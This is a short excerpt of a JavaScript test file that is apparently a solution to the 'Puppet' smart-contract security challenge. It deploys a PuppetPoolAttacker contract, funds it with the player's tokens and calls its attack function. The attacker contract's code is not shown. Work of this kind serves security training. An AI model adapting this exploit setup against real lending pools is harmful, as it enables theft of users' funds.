...
describe("[Challenge] Puppet", function () {
  ...
  it("Execution", async function () {
    ...
    //deploy contract
    [, , attackDeployer] = await ethers.getSigners();
    attacker = await (
      await ethers.getContractFactory("PuppetPoolAttacker", attackDeployer)
    ).deploy(
      player.address,
    ...
    //transfer token to attack contract
    await token
      .connect(player)
      .transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);

    //attack
    await attacker.connect(attackDeployer).attack();
  });
